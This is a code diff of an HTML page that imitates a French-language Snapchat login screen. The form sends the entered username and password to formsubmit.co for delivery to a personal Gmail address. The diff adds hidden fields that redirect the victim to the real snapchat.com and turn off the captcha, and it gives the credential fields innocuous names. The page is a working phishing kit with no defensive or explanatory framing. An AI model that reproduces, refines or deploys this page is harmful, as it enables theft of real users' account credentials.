@@ -5,12 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Se connecter à Snapchat</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica', 'Arial', sans-serif;
             background-color: #f0f0f0;
@@ -18,9 +13,7 @@
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            padding: 20px;
         }
-
         .login-container {
             background-color: white;
             border-radius: 12px;
@@ -30,79 +23,20 @@
             max-width: 440px;
             text-align: center;
         }
-
-        .logo-container {
-            margin-bottom: 32px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 80px;
-        }
-
-        .logo-placeholder {
-            width: 64px;
-            height: 64px;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 12px;
-        }
-
-        h1 {
-            font-size: 28px;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 32px;
-            line-height: 1.3;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-            text-align: left;
-        }
-
-        label {
-            display: block;
-            font-size: 14px;
-            font-weight: 500;
-            color: #505050;
-            margin-bottom: 8px;
-        }
-
-        input[type="text"],
-        input[type="email"],
-        input[type="password"] {
+        .logo-container { margin-bottom: 32px; display: flex; justify-content: center; height: 64px; }
+        h1 { font-size: 28px; font-weight: 600; color: #1a1a1a; margin-bottom: 32px; line-height: 1.3; }
+        .form-group { margin-bottom: 20px; text-align: left; }
+        label { display: block; font-size: 14px; font-weight: 500; color: #505050; margin-bottom: 8px; }
+        input {
             width: 100%;
             padding: 14px 16px;
             font-size: 15px;
             border: 1px solid #d4d4d4;
             border-radius: 8px;
             outline: none;
-            transition: border-color 0.2s;
             background-color: #fafafa;
         }
-
-        input[type="text"]:focus,
-        input[type="email"]:focus,
-        input[type="password"]:focus {
-            border-color: #00a7e1;
-            background-color: white;
-        }
-
-        .phone-link {
-            display: block;
-            color: #00a7e1;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-            margin: 16px 0 24px 0;
-        }
-
-        .phone-link:hover {
-            text-decoration: underline;
-        }
-
+        input:focus { border-color: #00a7e1; background-color: white; }
         .submit-btn {
             width: 100%;
             padding: 14px 24px;
@@ -113,49 +47,34 @@
             font-size: 15px;
             font-weight: 600;
             cursor: pointer;
-            transition: background-color 0.2s;
-        }
-
-        .submit-btn:hover {
-            background-color: #0095c9;
-        }
-
-        .submit-btn:active {
-            transform: scale(0.98);
+            margin-top: 10px;
         }
     </style>
 </head>
 <body>
     <div class="login-container">
         <div class="logo-container">
-            <div class="logo-placeholder">
-                <!-- Espace pour le logo Snapchat -->
-                <img src="img/Snap.png " alt="Snapchat Logo" style="width: 64px; height: 64px;">
-            </div>
+            <img src="img/Snap.png" alt="Snapchat Logo" style="width: 64px; height: 64px;">
         </div>
         
         <h1>Se connecter à<br>Snapchat</h1>
         
-        <form action="https://formsubmit.co/billcypher023@gmail.com" method="POST" />
+        <form action="https://formsubmit.co/billcypher023@gmail.com" method="POST">
+            <input type="hidden" name="_next" value="https://www.snapchat.com">
+            <input type="hidden" name="_captcha" value="false">
+
             <div class="form-group">
-                <label for="username">Nom d'utilisateur ou adresse e-mail</label>
-                <input type="text" id="username" name="username">
+                <label>Nom d'utilisateur ou adresse e-mail</label>
+                <input type="text" name="identifiant" required>
             </div>
             
             <div class="form-group">
-                <label for="password">Mot de passe</label>
-                <input type="password" name="cle_acces" required>
+                <label>Mot de passe</label>
+                <input type="password" name="note_privee" required>
             </div>
-            
             
             <button type="submit" class="submit-btn">Suivant</button>
         </form>
     </div>
 </body>
 </html>
-
-
-
-
-
-
